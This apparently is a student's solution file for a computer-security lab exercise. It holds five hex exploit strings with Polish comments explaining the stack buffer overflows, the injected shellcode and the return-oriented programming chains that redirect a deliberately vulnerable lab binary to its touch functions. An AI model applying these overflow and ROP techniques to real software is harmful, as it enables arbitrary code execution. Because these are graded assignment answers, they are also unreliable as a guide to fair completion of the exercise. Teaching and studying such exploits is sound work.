/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11 
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11 
/* nadpisanie adresu powrotnego na adres funkcji touch1 */
98 17 40


/* mov $0x61d22cf8, %rdi - wpisanie do rejestru rdi wartosci z pliku cookie.txt oraz ret(c3) */
48 c7 c7 f8 2c d2 61 c3
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* skok do instrukcji mov zapisanej na poczatku bufora */
e8 95 64 55 00 00 00 00 
/* po dodaniu do rsp 0x18 (rozmiar bufora) oraz skoku stack pointer zwiekszy sie o 24 + 8 wiec 
kolejny return uzyje adresu znajdujacego sie ponizej i przeniesie nas do funkcji touch2 */
c6 17 40


/* lea 16(%rsp),%rdi oraz return. Wartosc rdi ustalam poprzez dodanie 16 do adresu rsp poniwaz
w tym miejscu jest zapisana wartosc ciasteczka w postaci liczby szesnastkowej */
48 8d 7c 24 10 c3 00 00 
/* losowe liczby wypielniajace bufor. W przypadku wpisania tu
wartosci rdi zostanie ona nadpisana wiec musimy ja przeniesc na 16(%rsp).
Wedlug wykladu nr 5 tamta przestrzen nie powinna zostac nadpisana */
11 11 11 11 11 11 11 11
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11 
/* skok do instrukcji lea zapisanej na poczatku bufora */
e8 95 64 55 00 00 00 00 
/* adres funkcji touch3 */
a1 18 40 00 00 00 00 00
/* losowe liczby */
11 11 11 11 11 11 11 11
/* wartosc ciasteczka w postaci liczby szesnastkowej */
36 31 64 32 32 63 66 38 00


/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* chce zdjac ze stosu wartosc ciasteczka zapisana na kolejnych 8
 bajtach w tym celu znajduje funkcje setval_351 w ktÃ³rej pod adresem
 40194d znajduje sie 58 90 90 oraz c3 co oznacza pop rax, 2x nop oraz ret */
4d 19 40 00 00 00 00 00
/* wartosc ciasteczka */
f8 2c d2 61 00 00 00 00
/* teraz chcac przeniesc zawartosc rejestru rax do rdi musze wedlug tabeli
 zamieszczonej w tresci zadania znalezc instrukcje 48 89 c7 oraz c3. Znajduje
 ja pod adresem 401952 w funkcji getval_403 */
52 19 40 00 00 00 00 00
/* adres funkcji touch2 */
c6 17 40 00 00 00 00 00

/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* losowe liczby wypielniajace bufor */
11 11 11 11 11 11 11 11
/* Zapisanie wartosci rsp w rax (getval_420) */
cf 19 40 00 00 00 00 00
/* Zapisanie wartosci rax w rdi (getval_403) */
52 19 40 00 00 00 00 00
/* pop %rax (setval_351) */
4d 19 40 00 00 00 00 00
/* Zapisanie w rax wartosci ktora okresla odleglosc 
 ciasteczka od rsp */
50 00 00 00 00 00 00 00
/* W kolejnych krokach chce przeniesc wartosc rax -> rsi 
 Jako, ze nie moge tego zrobic bezposrednio jestem zmuszony
 wykonac kilka dodatkowych krokow przez inne rejestry */
/* eax -> edx (addval_157) (w instrukcjach znajduja sie wspomnianie
 w tresci zadania 2 bajtowe instrukcje pelniace role nop */
1c 1a 40 00 00 00 00 00
/* edx -> ecx (setval_155) */
8a 19 40 00 00 00 00 00
/* ecx -> esi (addval_242) */
23 1a 40 00 00 00 00 00
/* Fukcja add_xy sprawi ze wartosc rejestru rax bedzie wskazywac
 na rdi + rsi czyli nasze ciasteczko */
70 19 40 00 00 00 00 00
/* Zapisanie wartosci rax do rdi (getval_403) */
52 19 40 00 00 00 00 00
/* adres touch3 */
a1 18 40 00 00 00 00 00
00 00 00 00 00 00 00 00
/* wartosc ciasteczka w postaci liczby szesnastkowej */
36 31 64 32 32 63 66 38 00



